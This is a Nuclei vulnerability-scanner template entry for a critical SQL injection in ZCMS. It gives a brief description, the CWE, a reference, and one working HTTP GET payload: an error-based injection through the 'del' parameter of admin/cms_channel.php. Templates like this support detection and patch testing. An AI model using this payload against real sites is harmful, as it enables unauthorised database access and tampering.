# Nuclei Template: ZCMS - SQL Injection
**Template ID:** zcms-v3-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`zcms-v3-sqli.yaml`)

## Vulnerability Information & PoC

## Description
ZCMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'
```

## References
- https://www.anquanke.com/post/id/183241
